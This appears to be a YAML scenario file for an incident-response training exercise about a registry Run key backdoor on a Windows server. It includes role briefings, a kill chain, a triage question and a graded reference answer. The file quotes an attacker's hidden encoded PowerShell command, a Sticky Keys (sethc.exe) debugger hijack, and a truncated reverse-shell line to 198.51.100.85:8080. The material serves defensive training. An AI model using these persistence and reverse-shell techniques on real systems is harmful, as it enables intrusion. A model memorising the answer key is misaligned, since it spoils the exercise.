briefings:
  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
  incident_manager: You are the Incident Manager coordinating the response to Registry Run Key Backdoor with Encoded PowerShell Payload. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
  ciso: You are the CISO accountable for Registry Run Key Backdoor with Encoded PowerShell Payload. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
  executive: You are the executive sponsor for Registry Run Key Backdoor with Encoded PowerShell Payload. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
executive_brief: 'Executive summary of the Registry Run Key Backdoor with Encoded PowerShell Payload incident. An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded payload is stored in a separate registry value under HKLM\Software\CustomService\UpdateCheck. The attacker also created a second persistence point in the HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe key (Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>), providing a fallback persistence mechanism triggered by pressing Shift 5 times
  at the login screen. Sysmon detected the Run key modification (Event ID 12/13, TargetObject: HKLM\...\Run\Windows Security Service) at 03:15 AM on March 11. The PowerShell network connection to 198.51.100.85:8080 was also flagged by the network security appliance. Business impact: endpoint availability and integrity are at risk, and affected hosts may need reimaging before normal work resumes. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: privacy counsel should assess breach-notification duties once data access is confirmed.'
incident:
  title: Registry Run Key Backdoor with Encoded PowerShell Payload
  opening: 'An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>.'
  summary: 'An attacker who gained local administrator access to WEB-SRV-02 (10.10.40.11, Windows Server 2019) created a persistent backdoor by adding a new entry to the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. The entry (''Windows Security Service'') executes a PowerShell command on every system startup and user logon: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64>. The base64 payload decodes to a reverse shell connecting to 198.51.100.85:8080. The encoded payload is stored in a separate registry value under HKLM\Software\CustomService\UpdateCheck. The attacker also created a second persistence point in the HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe key (Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>), providing a fallback persistence mechanism triggered by pressing Shift 5 times at the login screen. Sysmon detected the Run key modification (Event ID 12/13, TargetObject: HKLM\...\Run\Windows
    Security Service) at 03:15 AM on March 11. The PowerShell network connection to 198.51.100.85:8080 was also flagged by the network security appliance.'
  compromised_assets:
  - WEB-SRV-02 (10.10.40.11) — Windows Server 2019
  - Windows Registry (HKLM Run key modified — 'Windows Security Service')
  - System startup process (backdoor executes on every boot)
  - sethc.exe debugger (fallback persistence via Sticky Keys)
  - PowerShell reverse shell to 198.51.100.85:8080
  - Registry value (HKLM\Software\CustomService\UpdateCheck — encoded payload)
  detected_via: Sysmon registry modification alert (Event ID 12/13, Run key modification at 03:15 AM); PowerShell network connection to external IP (198.51.100.85:8080); startup program audit
  kill_chain:
  - Local administrator access obtained on WEB-SRV-02
  - Encoded PowerShell payload stored in registry value (CustomService\UpdateCheck)
  - HKLM Run key created for auto-start persistence ('Windows Security Service')
  - sethc.exe debugger configured as fallback (Shift+Sticky Keys)
  - System restart triggers backdoor execution
  - Reverse shell established to 198.51.100.85:8080
  mitre_tactics:
  - TA0003 — Persistence
  - TA0005 — Defense Evasion
  - TA0011 — Command and Control
phases:
- id: registry_modification_detection
  phase_type: triage
  title: Registry Modification Detection
  situation: 'Sysmon has detected a registry modification on WEB-SRV-02 (10.10.40.11) at 03:15 AM on March 11. Event ID 12/13 shows a new value ''Windows Security Service'' was added to HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The value data is: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -enc <base64_string>. A secondary registry value was added under HKLM\Software\CustomService\UpdateCheck containing the same base64 payload. The base64 decodes to a reverse shell: $client = New-Object System.Net.Sockets.TCPClient(''198.51.100.85'',8080);... The backdoor will execute on every system restart.'
  prompt: How do you respond to the registry-based persistence?
  guidance:
    what: Establish what fired on WEB-SRV-02, which accounts are involved, and how urgent the signal is.
    action: How do you respond to the registry-based persistence?
    why: A wrong first read sends the whole response down the wrong path.
  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Registry Modification Detection. Asset in scope: WEB-SRV-02.'
  hints:
  - Application whitelisting is an excellent preventive measure but does not address the existing persistence.
  - Consider pulling the relevant logs for the affected window.
  ideal_concepts:
  - immediately remove
  - key entry
  - entry windows
  - windows security
  - security service
  - service delete
  - customservice registry
  - registry values
  reference_answer: |-
    Immediately remove the Run key entry ('Windows Security Service'), delete the CustomService registry values, block 198.51.100.85 at the perimeter, investigate the source of the local admin compromise, and deploy Sysmon with enhanced registry monitoring rules

    Why: Removing the registry entries eliminates the persistence. IP blocking stops C2 communications. Investigation identifies the initial access vector. Enhanced Sysmon rules detect future modifications.
  followup_good: 'Investigation of the registry modifications reveals a secondary persistence mechanism: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe with value Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>. This means pressing Shift 5 times at the login screen will execute the PowerShell reverse shell instead of the Sticky Keys accessibility feature. The IFEO debugger persistence is a well-known technique that survives Run key removal. Sysmon Event ID 13 captured the IFEO modification but the alert was not triaged.'
  followup_weak: |-
    Removing the registry entries eliminates the persistence.

    Investigation of the registry modifications reveals a secondary persistence mechanism: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe with value Debugger = C:\Windows\System32\cmd.exe /c powershell -enc <base64>. This means pressing Shift 5 times at the login screen will execute the PowerShell reverse shell instead of the Sticky Keys accessibility feature. The IFEO debugger persistence is a well-known technique that survives Run key removal. Sysmon Event ID 13 captured the IFEO modification but the alert was not triaged.
